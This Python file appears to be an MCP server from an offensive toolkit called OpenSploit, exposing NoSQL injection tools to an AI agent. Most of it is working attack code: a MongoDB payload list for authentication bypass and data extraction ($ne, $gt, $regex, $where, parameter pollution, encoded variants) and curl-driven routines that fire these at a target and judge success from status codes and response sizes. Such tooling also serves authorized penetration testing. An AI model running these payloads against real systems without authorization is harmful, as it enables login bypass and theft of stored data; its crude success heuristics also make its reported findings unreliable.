#!/usr/bin/env python3
"""
OpenSploit MCP Server: nosqlmap

NoSQL injection testing tool for MongoDB, CouchDB, and other NoSQL databases.
"""

import asyncio
import json
import os
import re
import subprocess
import tempfile
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse, parse_qs, urlencode

from mcp_common import BaseMCPServer, ToolResult, ToolError, sanitize_output


class NosqlmapServer(BaseMCPServer):
    """MCP server for NoSQL injection testing."""

    def __init__(self):
        super().__init__(
            name="nosqlmap",
            description="NoSQL injection testing tool for MongoDB, CouchDB, and other NoSQL databases",
            version="1.0.0",
        )

        self.register_method(
            name="scan",
            description="Scan a URL for NoSQL injection vulnerabilities",
            params={
                "url": {
                    "type": "string",
                    "required": True,
                    "description": "Target URL to test for NoSQL injection",
                },
                "method": {
                    "type": "string",
                    "default": "GET",
                    "description": "HTTP method (GET or POST)",
                },
                "data": {
                    "type": "string",
                    "description": "POST data in key=value&key2=value2 format",
                },
                "headers": {
                    "type": "object",
                    "description": "Custom headers as key-value pairs",
                },
                "database_type": {
                    "type": "string",
                    "default": "MongoDB",
                    "description": "Target database type: MongoDB, CouchDB, Redis",
                },
                "timeout": {
                    "type": "integer",
                    "default": 60,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.scan,
        )

        self.register_method(
            name="inject",
            description="Attempt NoSQL injection with various payloads",
            params={
                "url": {
                    "type": "string",
                    "required": True,
                    "description": "Target URL",
                },
                "parameter": {
                    "type": "string",
                    "required": True,
                    "description": "Parameter to inject into",
                },
                "method": {
                    "type": "string",
                    "default": "POST",
                    "description": "HTTP method (GET or POST)",
                },
                "data": {
                    "type": "string",
                    "description": "Base POST data (the parameter will be injected)",
                },
                "injection_type": {
                    "type": "string",
                    "default": "auth_bypass",
                    "description": "Injection type: auth_bypass, extract_data, blind",
                },
                "headers": {
                    "type": "object",
                    "description": "Custom headers",
                },
                "timeout": {
                    "type": "integer",
                    "default": 60,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.inject,
        )

        self.register_method(
            name="test_payloads",
            description="Test a list of NoSQL injection payloads against a target",
            params={
                "url": {
                    "type": "string",
                    "required": True,
                    "description": "Target URL",
                },
                "parameter": {
                    "type": "string",
                    "required": True,
                    "description": "Parameter to inject into",
                },
                "method": {
                    "type": "string",
                    "default": "POST",
                    "description": "HTTP method",
                },
                "data": {
                    "type": "string",
                    "description": "Base POST data",
                },
                "content_type": {
                    "type": "string",
                    "default": "form",
                    "description": "Content type: form, json",
                },
                "headers": {
                    "type": "object",
                    "description": "Custom headers",
                },
                "success_indicator": {
                    "type": "string",
                    "description": "String that indicates successful injection (e.g., 'Welcome', 'Dashboard')",
                },
                "error_indicator": {
                    "type": "string",
                    "description": "String that indicates failed attempt (e.g., 'Invalid', 'Error')",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.test_payloads,
        )

        # Common NoSQL injection payloads
        self.mongodb_payloads = [
            # Authentication bypass payloads
            ('{"$ne": null}', 'MongoDB $ne null bypass'),
            ('{"$ne": ""}', 'MongoDB $ne empty string bypass'),
            ('{"$gt": ""}', 'MongoDB $gt empty string bypass'),
            ('{"$regex": ".*"}', 'MongoDB regex wildcard'),
            ('{"$exists": true}', 'MongoDB exists true'),
            ('{"$nin": []}', 'MongoDB not in empty array'),
            # Array/operator injection
            ('admin\' || \'1\'==\'1', 'JavaScript string comparison'),
            ('admin\'||\'1\'==\'1', 'JavaScript no spaces'),
            ("{\"$where\": \"1==1\"}", 'MongoDB $where injection'),
            # URL encoded versions
            ('%7b%22%24ne%22%3a%22%22%7d', 'URL encoded $ne'),
            ('%7b%22%24gt%22%3a%22%22%7d', 'URL encoded $gt'),
            # Parameter pollution style
            ('[$ne]=', 'Parameter pollution $ne'),
            ('[$gt]=', 'Parameter pollution $gt'),
            ('[$regex]=.*', 'Parameter pollution regex'),
            ('[$exists]=true', 'Parameter pollution exists'),
            # Double encoding
            ('%257b%2522%2524ne%2522%253a%2522%2522%257d', 'Double URL encoded $ne'),
        ]

    async def scan(
        self,
        url: str,
        method: str = "GET",
        data: Optional[str] = None,
        headers: Optional[Dict[str, str]] = None,
        database_type: str = "MongoDB",
        timeout: int = 60,
    ) -> ToolResult:
        """Scan a URL for NoSQL injection vulnerabilities."""
        try:
            import httpx
        except ImportError:
            # Fall back to subprocess with curl
            pass

        results = {
            "target": url,
            "method": method,
            "database_type": database_type,
            "vulnerabilities": [],
            "tests_performed": 0,
            "potential_injection_points": [],
        }

        # Parse URL to find parameters
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if method.upper() == "POST" and data:
            # Parse POST data
            post_params = dict(p.split("=", 1) for p in data.split("&") if "=" in p)
            params.update({k: [v] for k, v in post_params.items()})

        if not params:
            return ToolResult(
                success=True,
                data={
                    **results,
                    "warning": "No parameters found to test. Provide URL parameters or POST data.",
                },
                raw_output="No injectable parameters found in the request.",
            )

        results["parameters_found"] = list(params.keys())

        # Test each parameter with basic payloads
        output_lines = [f"Scanning {url} for NoSQL injection vulnerabilities..."]
        output_lines.append(f"Parameters found: {', '.join(params.keys())}")
        output_lines.append(f"Database type: {database_type}")
        output_lines.append("")

        test_payloads = [
            ('{"$ne": ""}', "MongoDB operator injection"),
            ('{"$gt": ""}', "MongoDB comparison operator"),
            ("[$ne]=test", "Parameter pollution"),
        ]

        for param in params.keys():
            output_lines.append(f"Testing parameter: {param}")

            for payload, desc in test_payloads:
                results["tests_performed"] += 1

                # Build test URL/data
                test_result = await self._test_single_payload(
                    url, param, payload, method, data, headers, timeout
                )

                if test_result.get("potentially_vulnerable"):
                    results["vulnerabilities"].append({
                        "parameter": param,
                        "payload": payload,
                        "description": desc,
                        "evidence": test_result.get("evidence", ""),
                    })
                    output_lines.append(f"  [!] POTENTIAL VULNERABILITY: {desc}")
                    output_lines.append(f"      Payload: {payload}")
                    results["potential_injection_points"].append(param)

        results["potential_injection_points"] = list(set(results["potential_injection_points"]))

        summary = f"\nScan complete. {len(results['vulnerabilities'])} potential vulnerabilities found."
        output_lines.append(summary)

        return ToolResult(
            success=True,
            data=results,
            raw_output="\n".join(output_lines),
        )

    async def _test_single_payload(
        self,
        url: str,
        param: str,
        payload: str,
        method: str,
        data: Optional[str],
        headers: Optional[Dict[str, str]],
        timeout: int,
    ) -> Dict[str, Any]:
        """Test a single payload against a parameter."""
        result = {"potentially_vulnerable": False, "evidence": ""}

        # Build curl command
        cmd = ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}:%{size_download}"]

        if headers:
            for k, v in headers.items():
                cmd.extend(["-H", f"{k}: {v}"])

        cmd.extend(["--connect-timeout", str(min(timeout, 10))])

        if method.upper() == "POST":
            cmd.extend(["-X", "POST"])
            if data:
                # Inject payload into data
                modified_data = self._inject_into_data(data, param, payload)
                cmd.extend(["-d", modified_data])
            else:
                cmd.extend(["-d", f"{param}={payload}"])
        else:
            # Inject into URL
            modified_url = self._inject_into_url(url, param, payload)
            url = modified_url

        cmd.append(url)

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            output = stdout.decode().strip()

            # Parse response
            if ":" in output:
                status_code, size = output.split(":", 1)
                # Look for signs of successful injection
                # Different response size might indicate different behavior
                result["status_code"] = status_code
                result["response_size"] = size

                # Heuristics for detecting injection
                if status_code == "500":
                    result["potentially_vulnerable"] = True
                    result["evidence"] = "Server error (500) - may indicate injection processing"
                elif status_code in ["302", "301"] and "auth" in param.lower():
                    result["potentially_vulnerable"] = True
                    result["evidence"] = "Redirect response - possible auth bypass"

        except asyncio.TimeoutError:
            result["error"] = "Timeout"
        except Exception as e:
            result["error"] = str(e)

        return result

    def _inject_into_data(self, data: str, param: str, payload: str) -> str:
        """Inject payload into POST data."""
        parts = data.split("&")
        new_parts = []
        for part in parts:
            if "=" in part:
                key, value = part.split("=", 1)
                if key == param:
                    new_parts.append(f"{key}={payload}")
                else:
                    new_parts.append(part)
            else:
                new_parts.append(part)
        return "&".join(new_parts)

    def _inject_into_url(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter."""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if param in params:
            params[param] = [payload]

        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    async def inject(
        self,
        url: str,
        parameter: str,
        method: str = "POST",
        data: Optional[str] = None,
        injection_type: str = "auth_bypass",
        headers: Optional[Dict[str, str]] = None,
        timeout: int = 60,
    ) -> ToolResult:
        """Attempt NoSQL injection with various payloads."""
        results = {
            "target": url,
            "parameter": parameter,
            "injection_type": injection_type,
            "successful_payloads": [],
            "tests_performed": 0,
        }

        output_lines = [f"Attempting NoSQL injection on {url}"]
        output_lines.append(f"Parameter: {parameter}")
        output_lines.append(f"Injection type: {injection_type}")
        output_lines.append("")

        # Select payloads based on injection type
        if injection_type == "auth_bypass":
            payloads = self.mongodb_payloads[:10]  # Auth bypass focused
        elif injection_type == "extract_data":
            payloads = [p for p in self.mongodb_payloads if "regex" in p[1].lower() or "where" in p[1].lower()]
        else:
            payloads = self.mongodb_payloads

        for payload, desc in payloads:
            results["tests_performed"] += 1

            test_result = await self._test_single_payload(
                url, parameter, payload, method, data, headers, timeout
            )

            if test_result.get("potentially_vulnerable"):
                results["successful_payloads"].append({
                    "payload": payload,
                    "description": desc,
                    "evidence": test_result.get("evidence", ""),
                    "status_code": test_result.get("status_code"),
                })
                output_lines.append(f"[+] Potential injection: {desc}")
                output_lines.append(f"    Payload: {payload}")
                output_lines.append(f"    Evidence: {test_result.get('evidence', 'N/A')}")

        if results["successful_payloads"]:
            output_lines.append(f"\n[!] {len(results['successful_payloads'])} potential injection vectors found!")
        else:
            output_lines.append("\n[-] No successful injections found with tested payloads.")

        return ToolResult(
            success=True,
            data=results,
            raw_output="\n".join(output_lines),
        )

    async def test_payloads(
        self,
        url: str,
        parameter: str,
        method: str = "POST",
        data: Optional[str] = None,
        content_type: str = "form",
        headers: Optional[Dict[str, str]] = None,
        success_indicator: Optional[str] = None,
        error_indicator: Optional[str] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Test comprehensive list of NoSQL injection payloads."""
        results = {
            "target": url,
            "parameter": parameter,
            "content_type": content_type,
            "payloads_tested": 0,
            "successful": [],
            "errors": [],
            "baseline": None,
        }

        output_lines = [f"Testing NoSQL injection payloads on {url}"]
        output_lines.append(f"Parameter: {parameter}")
        output_lines.append(f"Content-Type: {content_type}")
        output_lines.append("")

        # Get baseline response first
        baseline = await self._get_response(url, parameter, "test", method, data, content_type, headers, timeout)
        results["baseline"] = {
            "status_code": baseline.get("status_code"),
            "response_length": baseline.get("length"),
        }
        output_lines.append(f"Baseline response: {baseline.get('status_code')} ({baseline.get('length')} bytes)")
        output_lines.append("")

        # Test all payloads
        all_payloads = self.mongodb_payloads + [
            # Additional JSON-specific payloads
            ('{"$ne":1}', 'JSON $ne number'),
            ('{"$where":"this.password.match(/.*/)"}', 'MongoDB $where regex'),
            ('{"$or":[{},{"a":"a"}]}', 'MongoDB $or bypass'),
            ('{"$and":[{"a":"a"},{"b":"b"}]}', 'MongoDB $and test'),
            # Unicode bypass attempts
            ('\\u0024ne', 'Unicode encoded $ne'),
        ]

        for payload, desc in all_payloads:
            results["payloads_tested"] += 1

            response = await self._get_response(
                url, parameter, payload, method, data, content_type, headers, timeout
            )

            is_successful = False
            evidence = []

            # Check for success indicators
            if success_indicator and response.get("body") and success_indicator in response["body"]:
                is_successful = True
                evidence.append(f"Success indicator '{success_indicator}' found")

            # Check for different response length (potential injection)
            if response.get("length") and baseline.get("length"):
                diff = abs(int(response["length"]) - int(baseline["length"]))
                if diff > 100:  # Significant difference
                    evidence.append(f"Response length difference: {diff} bytes")
                    if not error_indicator or (response.get("body") and error_indicator not in response["body"]):
                        is_successful = True

            # Check for different status code
            if response.get("status_code") != baseline.get("status_code"):
                if response.get("status_code") in ["200", "302"]:
                    is_successful = True
                    evidence.append(f"Status changed: {baseline.get('status_code')} -> {response.get('status_code')}")

            if is_successful:
                results["successful"].append({
                    "payload": payload,
                    "description": desc,
                    "evidence": evidence,
                    "response": {
                        "status_code": response.get("status_code"),
                        "length": response.get("length"),
                    }
                })
                output_lines.append(f"[+] SUCCESS: {desc}")
                output_lines.append(f"    Payload: {payload}")
                for e in evidence:
                    output_lines.append(f"    - {e}")

        output_lines.append("")
        output_lines.append(f"Tested {results['payloads_tested']} payloads")
        output_lines.append(f"Successful injections: {len(results['successful'])}")

        return ToolResult(
            success=True,
            data=results,
            raw_output="\n".join(output_lines),
        )

    async def _get_response(
        self,
        url: str,
        param: str,
        payload: str,
        method: str,
        data: Optional[str],
        content_type: str,
        headers: Optional[Dict[str, str]],
        timeout: int,
    ) -> Dict[str, Any]:
        """Get response for a payload."""
        cmd = ["curl", "-s", "-w", "\n%{http_code}:%{size_download}", "--connect-timeout", str(min(timeout, 10))]

        if headers:
            for k, v in headers.items():
                cmd.extend(["-H", f"{k}: {v}"])

        if method.upper() == "POST":
            cmd.extend(["-X", "POST"])

            if content_type == "json":
                cmd.extend(["-H", "Content-Type: application/json"])
                if data:
                    # Try to parse and inject into JSON
                    try:
                        json_data = json.loads(data)
                        json_data[param] = json.loads(payload) if payload.startswith("{") else payload
                        cmd.extend(["-d", json.dumps(json_data)])
                    except:
                        cmd.extend(["-d", data.replace(f'"{param}":', f'"{param}": {payload},')])
                else:
                    cmd.extend(["-d", json.dumps({param: payload if not payload.startswith("{") else json.loads(payload)})])
            else:
                if data:
                    modified_data = self._inject_into_data(data, param, payload)
                    cmd.extend(["-d", modified_data])
                else:
                    cmd.extend(["-d", f"{param}={payload}"])

        cmd.append(url)

        result = {"status_code": None, "length": None, "body": None}

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            output = stdout.decode()

            # Parse response
            lines = output.strip().split("\n")
            if lines:
                last_line = lines[-1]
                if ":" in last_line:
                    status, length = last_line.split(":", 1)
                    result["status_code"] = status
                    result["length"] = length
                    result["body"] = "\n".join(lines[:-1])

        except Exception as e:
            result["error"] = str(e)

        return result


if __name__ == "__main__":
    server = NosqlmapServer()
    server.run()
